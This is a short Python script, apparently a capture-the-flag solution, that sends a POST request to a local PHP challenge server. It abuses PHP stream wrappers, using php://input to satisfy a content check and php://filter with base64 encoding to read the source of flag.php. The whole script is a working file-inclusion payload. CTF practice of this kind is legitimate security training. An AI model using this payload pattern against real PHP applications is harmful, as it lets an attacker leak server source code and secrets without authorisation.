import requests
url="http://localhost:64102/?f2=php://input&f1=php://filter/read=convert.base64-encode/resource=flag.php"
data = '我朱浩男没有没有没有没出题！'
response = requests.post(url, data=data.encode('UTF8'))
print(response.text)